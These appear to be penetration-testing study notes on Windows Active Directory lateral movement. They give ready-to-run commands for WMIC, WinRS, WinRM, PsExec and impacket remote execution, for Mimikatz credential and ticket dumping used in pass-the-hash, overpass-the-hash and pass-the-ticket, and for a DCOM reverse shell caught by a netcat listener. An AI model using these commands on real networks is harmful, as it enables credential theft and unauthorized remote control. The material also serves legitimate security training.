### WMIC

This is deprecated in new Windows versions, and must be Local Admin to run this command, but if we are we can run

```powershell
wmic /node:<NODE-IP> /user:<USER> /password:<PASSWORD> process call create "calc"
```

### WINRS

Windows Remote Shell is command that needs the Domain Admin permission to be executed. WinRM is a built-in for WinRS

```powershell
winrs -r:<NODE-IP> -u:<USER> -p:<PASSWORD>  "cmd /c hostname & whoami"
```

### Powershell WinRM capability

We can use WinRM directly in Powershell with the script

```powershell
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <IP> -Credential $credential
```

We can switch between PS WinRM sessions with

```powershell
Enter-PSSession 1
```

### PsExec

PsExec is a good utility in the [SysInternals suite](https://learn.microsoft.com/en-us/sysinternals/downloads/). To use this we have to be Local Administrators and the ADMIN$ share must be exposed with File and Printer Sharing that has to be turned on. This, in the Windows AD machines is enabled by default. We can run PsExec with the following syntax.

```powershell
./PsExec64.exe -i  \\<MACHINE-IP> -u corp\<USER> -p <PASSWORD> cmd
```

From the kali machine we can use **impacket-psexec** to run commands on Windows AD joined machines

```shell
proxychains impacket-psexec <DOMAIN>/Administrator:'PASSWORD'@<IP>
```

### Pass the hash

If the server has SMB active and the Windows File and Printer Sharing feature to be enabled we can use the previously gained hash to authenticate has another user using only the hash. For this purpose we can use the `impacket-wmiexec` utility in Kali. This will not work in Kerberos authentication but can grant us the access to the system.

```powershell
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<IP>
```

### Overpass the hash

We can abuse the hash to gain a full Kerberos TGT to gain then a TGS. To run this attack the credentials has to be cached and this means that in the machine there has to be a session for another user that executed some programs before us. Then we can rely on Mimikatz to get the cached hashes. `The core concept of this attack is to obtain functionant TGT Kerberos ticket without using the NTLM authentication actively over the network.`

```powershell
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:<USER> /domain:<ORG> /ntlm:<NTLM-HASH> /run:powershell
```

In the new shell we can use

```powershell
net use \\<SMB-SHARE>
klist
```

To list all tickets. If we don't use some authentication before, we will not have any tickets because this is a new session.

We can now use `PsExec` to perform a lateral movement on the user we impersonated before

```powershell
.\PsExec.exe \\files04 cmd
```

**In this way we can convert a NTLM hash in a TGT and we can use tools like PsExec to authenticate in another Windows machine with the TGT ticket. **

### Pass the ticket

If a TGT ticket stays for the machine it was created for, but a TGS can be used in more ways. Here the TGS is reused to authenticate over the network and if the ticket belong to the current user, no Admin privilege is required. Here again we have to gain a pre-existent session in the machine and we have to dump the hashes and export them in the directory. This will create some `.kirbi` files that can be re-imported for another user.

```powershell
privilege::debug
sekurlsa::tickets /export
```

This is the Mimikatz command to import a ticket inside the current user session

```powershell
kerberos::ptt [0;12bd0]-0-0-xxxxxxxx-<USER>@<SERVICE>-<MACHINE>.kirbi
```

Again with `klist` we can list our new tickets (the new one should appear) and we can use the ticket to enter the service the ticket was for.

### DCOM

The Distributed Component Object Model can be used to perform lateral movement too. This is based on [COM](https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal?redirectedfrom=MSDN) and is used for inter-communication between computer on a network. DCOM needs RCP on the TCP port 135 to be executed and a local Admin access. It is based on the Microsoft Management Console. We can run a reverse shell with DCOM with

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <REVSHELL-ENCODED>","7")
```

On our attacker computer we must have a netcat listener active